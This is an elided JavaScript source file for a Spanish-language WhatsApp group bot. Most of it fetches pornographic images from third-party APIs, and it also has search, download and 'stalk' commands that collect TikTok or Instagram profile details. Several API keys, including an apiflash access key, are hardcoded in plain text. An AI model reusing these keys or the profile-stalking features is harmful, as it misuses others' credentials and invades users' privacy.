            quoted: mek})
break
...
if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply('modo nsfw no activado')
 authxor = ["https://za-api.herokuapp.com/api/cewe/vietnam?apikey=ApiRifzaBot"]
 porn = await fetchJson(`${authxor}`, { method: 'get'})
buffer = await getBuffer(`${porn.result.url}`)
gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`vietnam`, buttonText:{displayText:'NEXT➡️'},type:1}]
mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagevietnam = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagevietnam, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
...
if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply('modo nsfw no activado')
authorr = ["https://za-api.herokuapp.com/api/cewe/china?apikey=ApiRifzaBot"]
porn = await fetchJson(`${authorr}`, { method: 'get'})
buffer = await getBuffer(`${porn.result.url}`)
gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`china`, buttonText:{displayText:'NEXT➡️'},type:1}]
mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagechina = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagechina, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes',  quoted: mek})
break
case 'malasia':
if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply('modo nsfw no activado')
authior = ["https://za-api.herokuapp.com/api/cewe/malaysia?apikey=ApiRifzaBot"]
porn = await fetchJson(`${authior}`, { method: 'get'})
buffer = await getBuffer(`${porn.result.url}`)
gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`malasia`, buttonText:{displayText:'NEXT➡️'},type:1}]
mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagemalasia = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagemalasia, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
...
if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply('modo nsfw no activado')
authorrr = ["https://za-api.herokuapp.com/api/cewe/korea?apikey=ApiRifzaBot"]
porn = await fetchJson(`${authorrr}`, { method: 'get'})
 buffer = await getBuffer(`${porn.result.url}`)
gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`korea`, buttonText:{displayText:'NEXT➡️'},type:1}]
mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagekorea = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagekorea, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
...
if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply('modo nsfw no activado')
aauthor = ["https://za-api.herokuapp.com/api/cewe/indonesia?apikey=ApiRifzaBot"]
 porn = await fetchJson(`${aauthor}`, { method: 'get'})
bufffer = await getBuffer(`${porn.result.url}`)
gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`indonesia`, buttonText:{displayText:'NEXT➡️'},type:1}]
mhan = await denz.prepareMessage(from, bufffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessageindo = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessageindo, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
...
if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply('modo nsfw no activado')
 auuthor = ["https://za-api.herokuapp.com/api/cewe/thailand?apikey=ApiRifzaBot"]
 porn = await fetchJson(`${auuthor}`, { method: 'get'})
buuffer = await getBuffer(`${porn.result.url}`)
gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`thailand`, buttonText:{displayText:'NEXT➡️'},type:1}]
mhan = await denz.prepareMessage(from, buuffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagethailand = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagethailand, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
...
if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply('modo nsfw no activado')
 authhor = ["https://za-api.herokuapp.com/api/cewe/japan?apikey=ApiRifzaBot"]
 porn = await fetchJson(`${authhor}`, { method: 'get'})
 buffer = await getBuffer(`${porn.result.url}`)
gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`japan`, buttonText:{displayText:'NEXT➡️'},type:1}]
mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagejapan = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagejapan, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
case 'tetas2':
					...
					buffer = await getBuffer(`${porn.url}`)
					teeext = `${porn.title}`
					gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`tetas2`, buttonText:{displayText:'NEXT➡️'},type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagesssxss = {
imageMessage: mhan.message.imageMessage,
contentText: teeext,
footerText: 'No preguntes, solo gózalo',  
buttons: gbutsan, 
headerType: 4}
denz.sendMessage(from, buttonMessagesssxss, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
case 'pussy':
					...
					buffer = await getBuffer(`${porn.url}`)
					texxt = `${porn.title}`
					gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`pussy`, buttonText:{displayText:'NEXT➡️'},type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagessssss = {
imageMessage: mhan.message.imageMessage,
contentText: texxt,
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagessssss, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
case 'ass':
					if (!isGroup) return reply(mess.only.group)
					anux = ["https://api-yogipw.herokuapp.com/api/nsfw/ass"]
					 porn = await fetchJson(`${anux}`, { method: 'get'})
                     buffer = await getBuffer(`${porn.result}`)
					gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`ass`, buttonText:{displayText:'NEXT➡️'},type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
...
denz.sendMessage(from, buttonMessagesssss, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
case 'ahegao':
					if (!isGroup) return reply(mess.only.group)
					aanu = ["https://api-yogipw.herokuapp.com/api/nsfw/ahegao"]
					porn = await fetchJson(`${aanu}`, { method: 'get'})
                    buffer = await getBuffer(`${porn.result}`)
					gbutsan = [{buttonId:`nsfwmenu`,buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`ahegao`,buttonText:{displayText:'NEXT➡️'},type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagex = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagex, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
case 'bdsm':
					if (!isGroup) return reply(mess.only.group)
					anuuu = ["https://api-yogipw.herokuapp.com/api/nsfw/bdsm"]
					 porn = await fetchJson(`${anuuu}`, { method: 'get'})
                     buffer = await getBuffer(`${porn.result}`)
					gbutsan = [{buttonId:`nsfwmenu`,buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`bdsm`,buttonText:{displayText:'NEXT➡️'},type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagexx = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagexx, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
case 'blowjob':
					if (!isGroup) return reply(mess.only.group)
					annu = ["https://api-yogipw.herokuapp.com/api/nsfw/blowjob"]
					 porn = await fetchJson(`${annu}`, { method: 'get'})
                     buffer = await getBuffer(`${porn.result}`)
					gbutsan = [{buttonId:`nsfwmenu`,buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`blowjob`,buttonText:{displayText:'NEXT➡️'},type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagexxx = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagexxx, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
case 'cuck':
					if (!isGroup) return reply(mess.only.group)
					anuq = ["https://api-yogipw.herokuapp.com/api/nsfw/cuckold"]
					 porn = await fetchJson(`${anuq}`, { method: 'get'})
                     buffer = await getBuffer(`${porn.result}`)
					gbutsan = [{buttonId:`nsfwmenu`,buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`cuck`,buttonText:{displayText:'NEXT➡️'},type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagexxxx = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagexxxx, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
case 'cum':
					if (!isGroup) return reply(mess.only.group)
					 anuw = ["https://api-yogipw.herokuapp.com/api/nsfw/cum"]
					 porn = await fetchJson(`${anuw}`, { method: 'get'})
                    buffer = await getBuffer(`${porn.result}`)
					gbutsan = [{buttonId:`nsfwmenu`,buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`cum`,buttonText:{displayText:'NEXT➡️'},type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagexxxxx = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagexxxxx, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
case 'ero':
					if (!isGroup) return reply(mess.only.group)
					 anwu = ["https://api-yogipw.herokuapp.com/api/nsfw/ero"]
				    porn = await fetchJson(`${anwu}`, { method: 'get'})
                    buffer = await getBuffer(`${porn.result}`)
					gbutsan = [{buttonId:`nsfwmenu`,buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`ero`,buttonText:{displayText:'NEXT➡️'},type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
...
denz.sendMessage(from, buttonMessagen, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
case 'femdom':
					if (!isGroup) return reply(mess.only.group)
					anur = ["https://api-yogipw.herokuapp.com/api/nsfw/femdom"]
					porn = await fetchJson(`${anur}`, { method: 'get'})
                    buffer = await getBuffer(`${porn.result}`)
					gbutsan = [{buttonId:`nsfwmenu`,buttonText:{displayText:'ATRAS⬅️'},type:1},{buttonId:`femdom`,buttonText:{displayText:'NEXT➡️'}, type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagenn = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagenn, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
case 'patas':
					if (!isGroup) return reply(mess.only.group)
					anut = ["https://api-yogipw.herokuapp.com/api/nsfw/foot"]
					porn = await fetchJson(`${anut}`, { method: 'get'})
                    buffer = await getBuffer(`${porn.result}`)
					gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'}, type:1},{buttonId:`patas`, buttonText:{displayText:'NEXT➡️'}, type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagennn = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagennn, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
case 'lentes':
					if (!isGroup) return reply(mess.only.group)
					anuy = ["https://api-yogipw.herokuapp.com/api/nsfw/glasses"]
					porn = await fetchJson(`${anuy}`, { method: 'get'})
                    buffer = await getBuffer(`${porn.result}`)
					gbutsan = [{buttonId:`nsfwmenu`, buttonText:{displayText:'ATRAS⬅️'}, type:1}, {buttonId:`lentes`, buttonText:{displayText:'NEXT➡️'}, type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
const buttonMessagennnn = {
imageMessage: mhan.message.imageMessage,
contentText: "🤔",
footerText: 'No preguntes, solo gózalo',
buttons: gbutsan,
...
denz.sendMessage(from, buttonMessagennnn, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'),
        caption: 'Tes',
            quoted: mek})
break
...
case 'googlef':
case 'ggf':
              if (!c) return reply('ingrese su consulta')
              ss = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=6670910454a34b69b99930aa1ad42b4d&url=https://google.com/search?q=${c}`)
              if(c == undefined || c == ' ') return reply(`*Ingrese texto*\n\nEjemplo : ${prefix}googlef naruto `)
               denz.sendMessage(from, ss, image, {thumbnail: Buffer.alloc(0),caption: `🤨`, quoted: mek})
                   break
case 'simi':
case ',':
					if (args.length < 1) return reply('Texto?')
					tuext = body.slice(5)
					anu = await fetchJson(`https://api.simsimi.net/v2/?text=${tuext}&lc=es`)
					simi = `${anu.success}`
					reply2(simi)
					break
//Jadi
case 'jadibot':
if (from.endsWith('@g.us')) return reply2('No puede ser un bot en el grupo')
...
└──────[ GITHUB ]──────❒
  ...
  │◦➛https://github.com/
  └─────────────────❒`
/* const buttons = [{buttonId: `menu`, buttonText: {displayText: 'ATRAS➡️'}, type: 1},{buttonId: `owner`, buttonText: {displayText: 'DUEÑO👤'}, type: 1}]
 const buttonMessage = {
    contentText: `${anu}`,
    footerText: '_Hatori_',
    buttons: buttons,
...
denz.sendMessage(from, anu, MessageType.text, {quoted: ftok})
		break
/*case 'inibuatwelcome':
reply2(`Bienvenid@, lea las reglas del grupo primero\n Soy un bot de whatsapp que sirvo\n para hacer sticker, descargar musica e imágenes')
break*/ 
case 'wel':
			try {
...
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
           ...
           const sextin = await getBuffer(pporang)
			let busff = await getBuffer(`https://kuontol-api.herokuapp.com/api/welcome?nama=${sender.split('@')[0]}@c.us&member=${groupOwner}&gc=${encodeURI(groupMetadata.subject)}&pp=${sextin}&bg=https://cdn.wallpapersafari.com/38/89/pZxtn4.jpg`)
		denz.sendMessage(from, busff, image, {thumbnail: sextin})
break

case 'welcomeAS':
const herrr = `Bienvenido al Grupo : ${groupName}\n\n
✠• Pᴇʀᴍɪᴛɪᴅᴏ  •✠ • •══╦╗   
⛩️Anime.
📄Manga.
🔞Hentai.
...
🌐Noticias.
✠• Nᴏ Pᴇʀᴍɪᴛɪᴅᴏ  •✠ • •══╦╗
⁉️Spam. No cadenas, No links, etc.
👻No Fantasmas. Contador en 0-30 ¡BAM!
❌Prohibido el CP.❌
★・・・Bienvenid@s・・・★`
denz.sendMessage(from, herrr, MessageType.text, {quoted: ftok})
break
case 'wel2':
reply(`Bienvenido al Grupo : \n${groupName}\n✠• Pᴇʀᴍɪᴛɪᴅᴏ  •✠ • •══╦╗\n⛩️Anime.\n📄Manga.\n🔞Hentai.\n🎵Música.\n🎬Peliculas.\n📺Series.\n🌐Noticias.\n✠• Nᴏ Pᴇʀᴍɪᴛɪᴅᴏ  •✠ • •══╦╗\n⁉️Spam. No cadenas, No links, etc.\n👻No Fantasmas. Contador en 0-30 ¡BAM!\n❌Prohibido el CP.❌\n★・・・Bienvenid@s・・・★`)
break
case 'inibuatout':
reply2('¿Por qué se despide a la gente? Déjalos salir al menos no tienen una cuota.')
break
       case 'debug':
...
/*case 'igstalk':
		       if (!c) return reply('Username?')
		            const tod = await fetchJson(`https://ferdiz-afk.my.id/api/stalkig?username=${c}`);
var nih_buff = await getBuffer(tod.picurl);
const tt = `*INSTAGRAM STALK*
\n👤Username: ${tod.username}\n👤Fullname: ${tod.fullname}\n📝Publicaciones: ${tod.post}\nCategoria: ${tod.category_name}\nVerificado?: ${tod.verified_user}\nPrivado?: ${tod.private_user}\nFollowing: ${tod.following}\nFollower: ${tod.followers}\nBio:\n${tod.bio}`;
denz.sendMessage(from, nih_buff, image, { quoted: mek, caption: tt });
break */
case 'pin3':
                denz.sendMessage(from, {url: `http://sanz-api.herokuapp.com/api/search/pinterest?q=${args.join(" ")}&apikey=hayuk`}, image, {thumbnail: Buffer.alloc(0)})
                break
case 'dstk2':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!c) return reply('nombre?')
					datas = await fetchJson(`https://api.zeks.xyz/api/searchsticker?apikey=apivinz&q=${c}` , {merhod: 'get'})
				
					for (let i of datas.sticker) {
						teks = ` ${i}`
					}
					sendMediaURL(from, teks, sticker)
					break
case 'dstk':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!c) return reply('nombre?')
					datas = await fetchJson(`https://api.zeks.xyz/api/searchsticker?apikey=apivinz&q=${c}`, {method:'get'})
					teks = `${datas.sticker}`
...
if (!c) return reply('nombre?')
					...
					anu = await axios.get(`https://tinyurl.com/api-create.php?url=${c}`)
					sendStickerUrl(from, anu.data)
					break
case 'bstk':
if (!c) return reply('nombre?')
					datas = await fetchJson(`https://api.zeks.xyz/api/searchsticker?apikey=apivinz&q=${c}`)
					teks = '>>>>>>>>>>>>>>>>>>>>>>\n'
					for (let i of datas.sticker) {
						teks += `\n*‣Link sticker* : ${i}\n>>>>>>>>>>>>>>>>>>>>>>\n`
					}
					denz.sendMessage(from, teks, MessageType.text, {quoted: mek})
					break
...
case "facebook": 
      case "fb": {
        ...
        if (!c) return reply('Link?')
        reply(mess.wait)
        let  { data } = await axios.get(`https://api.xteam.xyz/dl/fbv2?url=${args[0]}&APIKEY=nandowangy`)
        let { sd } = data.result
       /* let { jojo } = url.sd.url
        const videofb = await axios.get(`https://tinyurl.com/api-create.php?url=${linkk}`)
        const tinyv = `${videofb.data}`
          const  jojo  = `${sexoo.url.url}`
       let captions = `Titulo : ${data.result.meta.title}\n Duracion: ${data.result.meta.duration}`*/
        sendMediaURL(from, { url : sd.url }, { quoted: mek})
      } catch (e) {
        console.log(e)
        reply(mess.error.api)
      }
...
case 'ttstalk': {
      try {
           if (!c) return reply('Username?')   
              tamnel = fs.readFileSync('./denz.jpg')
              res = await axios.get(`https://yuzzu-api.herokuapp.com/api/tiktod/stalk?username=${c}`)
              ...
              console.log(res)
              capt = `*Tiktok Stalk*\n\n *👤Nickname* : ${nickname}\n*👤Username* : ${uniqueId}\n*🔒Id* : ${id}\n*☕Creado* : ${createTime}\n*✔️Verificado* : ${verified}\n*👁️Cuenta Privada* : ${privateAccount}\n\n Stats \n\n*🔖Seguidores* : ${followerCount}\n*🔖Siguiendo* : ${followingCount}\n*❤️Likes* : ${heartCount}\n*🎥Videos* : ${videoCount}`
              foto = await getBuffer(avatarLarger)
              denz.sendMessage(from, foto, MessageType.image, {quoted: mek, thumbnail: tamnel, caption: capt})
              } catch (e) {
        console.log(e)
        reply(mess.error.api)
         }
...
break
    ...
    if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            ...
            reply('Sube/responde foto/video')
            }
            break
case 'anime':
		            reply(mess.wait)
		            ...
		            const pjr = tod[Math.floor(Math.random() * tod.length)];
		            imageToBase64(pjr)
		            .then((response) => {
		             const media =  Buffer.from(response, 'base64');
		            denz.sendMessage(from,media,image,{thumbnail: Buffer.alloc(0), quoted:mek,caption:'anime random 😎'})
		            }
		            )
		            .catch((error) => {
		            console.log(error); 
		            ...
		            break
case 'imagen':
		            if (args.length < 1) return fakegroup('Escriba el nombre de la imagen!')
		            const gimg = args.join('');
		            reply(mess.wait)
		            gis(gimg, async (error, result) => {
		            n = result
		            images = n[Math.floor(Math.random() * n.length)].url
		            denz.sendMessage(from,{url:images},image,{thumbnail: Buffer.alloc(0),quoted:mek})
		            });
		            break
case 'viewonce':
res = await denz.prepareMessageFromContent(from,{
...
case 'pinterest':
case 'pin':
if (!c) return reply('y el nombre ?')
sexo = fs.readFileSync('./denz.jpg')
pinterest(`${c}`).then( data => {
const amsulah = data.result
const pimterest = amsulah[Math.floor(Math.random() * amsulah.length)]
sendMediaURL (from ,pimterest, {thumbnail: sexo}, `Pinterest : ${c}`)
})
break
case 'pin2': 
                    if (!c) return reply('y el nombre?')
					if (!isGroup) return reply(mess.only.group)
					sexo = fs.readFileSync('./denz.jpg')
					pw = [`https://api-yogipw.herokuapp.com/api/search/pinterest?query=${c}`]
					nk = pw[Math.floor(Math.random() * pw.length)]
					porn = await fetchJson(`${nk}`, { method: 'get' })
					buffer = await getBuffer(`${nk}`)
					denz.sendMessage(from, buffer, image, {thumbnail: sexo, quoted: mek })
			break
...
break
case 'q': 
    if (!m.quoted) return reply('responde un mensaje')
    let qse = denz.serializeM(await m.getQuotedObj())
    if (!qse.quoted) return reply('el mensaje que marcó no tiene una repuesta!')
...
case 'listgroup':
  ...
  case 'caripesan':
  case 'buscador':
if (args.length < 1) return reply(`Escriba ${prefix}caripesan Hi|15`)
tekse = args.join('')
if (tekse.includes("|")) { 
try {
var ve = tekse.split("|")[0]
var za = tekse.split("|")[1]
if (za > 15) return reply('maximo 15')
sampai = `${za}`
batas = parseInt(sampai) + 1
cok = await denz.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Mensaje no encontrado!') 
if (cok.messages.length < parseInt(batas)) reply(`Encontrado Solo ${cok.messages.length - 1} Mensajes`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
denz.sendMessage(from, `Aqui esta el mensaje!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
...
reply(`Escriba ${prefix}caripesan Hi|15`)
}
break
  case 'get':
case 'fetch':
            ...
            case 'autorespuesta':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Escribe ${prefix}autorespon on/off`)
           if (c === 'on'){
              autorespon = false
                    reply(`Habilito con éxito la respuesta automática`)
                } else if (c === 'off'){
                    autorespon = true
                    reply(`Deshabilito con éxito la respuesta automática`)
                } else {
                    reply(mess.error.api)
                }
                break
                case 'setprefix':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Ingresar prefijo\nOpciones :\n=> multi\n=> nopref`)
           if (c === 'multi'){
              multi = true
                    reply(`Prefijo cambiado con éxito a: ${c}`)
                } else if (c === 'nopref'){
                    multi = false
                    nopref = true
                    reply(`Prefijo eliminado con éxito ${c}`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    reply(`Prefiji cambiado con éxito a: ${c}`)
                }
                break
        case 'test':
				case 'cek':
...
case 'tictactoe':
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('escoge a tu oponente ')
if (isTTT) return reply('Hay un juego en curso, espere')
...
denz.sendMessage(from, `*🎳Comienzo del juegoTictactoe 🎲*

[@${player2.split('@')[0]}] Te desafio a ser el oponente del juego🔥
Responde Y/N si quieres aceptar Y, si deseas negarte N.

Escriba ${prefix}delttc , Para restablecer los juegos en este grupo!`, text, {contextInfo: {mentionedJid: [player2]}})
break
                case 'delttt':
                case 'delttc':
if (!isGroup) return reply(mess.only.group)
...
const buMess = {
    ...
    footerText: 'Escoge el modo que desee',
    buttons: buttonss,
    headerType: 1
}
...
break
				...
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
			publik = true
				reply('Modo publico activado con éxito')
			break
			case 'self':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				publik = false
				reply('Modo privado activado con éxito')
			break
		case 'gimage':
case 'googleimage':
case 'ggi':
if (args.length < 1) return reply('que imagen desea buscar?')
reply(mess.wait)
teks = args.join(' ')
res = await googleImage(teks, google)
function google(error, result){
if (error){ return reply('_[ ! ] Error/Resultado no encontrado_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: mek, caption: `*Resultado de la busqueda de :* ${teks}`})
}
}
break
				case 'herolist':
...
case 'ggl':
if (!c) return reply('y el nombre ?')
if (args.length < 1) return reply('que link desea obtener?')                            
anu = await fetchJson(`http://hadi-api.herokuapp.com/api/googlesearch?q=${c}&length=10`)
kant = ``
for (let i of anu.hasil) {
kant += `*Nombre* : ${i.title}\n*Link* : ${i.link}\n\n`
}
var akhirr = kant.trim()
reply(akhirr)
break
				case 'google':
case 'googlesearch':
...
return reply('_[ ! ] Error Resultado no encontrado_') 
}) 
result = `*Nombre :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
...
break
case 'mediafire':
if (args.length < 1) return reply('Link mediafire donde esta? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.api)
if (Number(filesize) >= 80000) return reply(`*Nombre :* ${res[0].nama}
*Peso :* ${res[0].size}
*Link :* ${res[0].link}
...
_Archivo enviandose, Espere unos minutos_`
reply(result)
...
